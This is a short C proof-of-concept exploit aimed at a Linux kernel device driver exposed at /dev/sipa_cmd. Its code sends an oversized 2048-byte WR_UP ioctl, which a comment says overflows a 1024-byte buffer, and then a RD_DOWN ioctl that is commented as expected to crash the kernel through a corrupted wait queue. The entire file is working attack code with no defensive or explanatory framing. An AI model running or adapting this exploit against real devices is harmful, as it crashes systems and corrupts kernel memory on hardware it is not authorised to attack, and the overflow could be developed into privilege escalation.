#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <string.h>

struct dev_comm_data {
    uint32_t opt;
    uint32_t param_id;
    uint32_t payload_size;
    uint32_t reserve;
    uint8_t payload[];
};

#define SIPA_TUNING_CTRL_WR_UP   _IOW(0x10, 0xE0, struct dev_comm_data)
#define SIPA_TUNING_CTRL_RD_DOWN _IOR(0x10, 0xE3, struct dev_comm_data)

int main() {
    int fd = open("/dev/sipa_cmd", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    // DATA_MAX_LEN = 1024, we send 2048 bytes to overflow into cmddown
    uint32_t payload_size = 2048;
    size_t total_size = sizeof(struct dev_comm_data) + payload_size;
    struct dev_comm_data *msg = calloc(1, total_size);
    msg->opt = 0;               // OPT_SET_CAL_VAL
    msg->param_id = 0;
    msg->payload_size = payload_size;
    memset(msg->payload, 0x41, payload_size);

    printf("Sending oversized WR_UP (%zu bytes)...\n", total_size);
    if (ioctl(fd, SIPA_TUNING_CTRL_WR_UP, msg) < 0) {
        perror("WR_UP ioctl");
        return 1;
    }

    printf("Triggering RD_DOWN on corrupted wait queue...\n");
    struct dev_comm_data rsp;
    ioctl(fd, SIPA_TUNING_CTRL_RD_DOWN, &rsp);  // expects kernel crash

    close(fd);
    return 0;
}
